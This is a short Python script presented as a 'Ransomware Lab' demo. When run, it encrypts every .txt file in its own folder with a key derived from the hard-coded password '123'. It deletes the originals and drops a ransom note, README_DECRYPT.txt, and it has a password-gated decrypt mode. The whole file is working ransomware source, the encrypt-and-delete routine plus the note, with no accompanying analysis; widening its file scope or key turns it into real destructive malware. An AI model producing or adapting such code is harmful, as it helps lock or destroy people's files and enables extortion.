import os
import sys
import hashlib
import base64
from cryptography.fernet import Fernet

EXTENSIONS = ['.txt']
PASSWORD = "123"

RANSOM_NOTE = """!!! YOUR FILES HAVE BEEN LOCKED !!!

All .txt files have been encrypted.

How to decrypt:
1. Drag and drop .locked file onto ran.exe
2. Enter password: 123

This is only a lab demo.
"""

def get_fernet(pwd):
    key = hashlib.sha256(pwd.zfill(3).encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = get_fernet(PASSWORD)
        encrypted = fernet.encrypt(data)
        
        locked_path = file_path + ".locked"
        with open(locked_path, "wb") as f:
            f.write(encrypted)
        
        os.remove(file_path)
        print("[+] Encrypted:", file_path)
        return True
    except:
        return False

def decrypt_file(locked_path):
    try:
        print("=== DECRYPT MODE ===")
        pwd = input("Enter 3-digit password: ")
        
        if pwd != PASSWORD:
            print("Wrong password!")
            return False
        
        fernet = get_fernet(pwd)
        with open(locked_path, "rb") as f:
            encrypted = f.read()
        
        decrypted = fernet.decrypt(encrypted)
        original = locked_path.replace(".locked", "")
        
        with open(original, "wb") as f:
            f.write(decrypted)
        
        os.remove(locked_path)
        print("[+] Decrypted successfully:", original)
        return True
    except:
        print("Decryption failed!")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1].endswith(".locked"):
        decrypt_file(sys.argv[1])
    else:
        print("Running Ransomware Lab...")
        count = 0
        folder = os.path.dirname(os.path.abspath(sys.argv[0]))
        
        for file in os.listdir(folder):
            if file.lower().endswith('.txt') and not file.endswith('.locked'):
                if encrypt_file(os.path.join(folder, file)):
                    count += 1
        
        with open(os.path.join(folder, "README_DECRYPT.txt"), "w", encoding="utf-8") as f:
            f.write(RANSOM_NOTE)
        
        print(f"\nDONE! Encrypted {count} files.")
        print("README_DECRYPT.txt created.")

    input("\nPress Enter to exit...")